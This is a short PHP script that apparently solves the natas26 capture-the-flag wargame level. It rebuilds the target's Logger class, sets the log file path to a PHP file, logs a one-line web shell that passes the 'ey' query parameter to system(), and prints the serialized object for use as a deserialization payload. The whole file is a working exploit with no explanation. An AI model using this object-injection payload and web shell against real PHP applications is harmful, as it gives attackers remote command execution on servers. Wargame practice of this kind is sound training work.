<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
  
    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        // $this->logFile = "/tmp/natas26_" . $file . ".log";
        $this->logFile = "./" . $file . ".log";
  
        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       
  
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
  
    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }                       
}



$obj = new Logger("eyob.php");
$obj -> log('<?php system($_GET["ey"]); ?>');

echo htmlspecialchars(serialize($obj));


?> 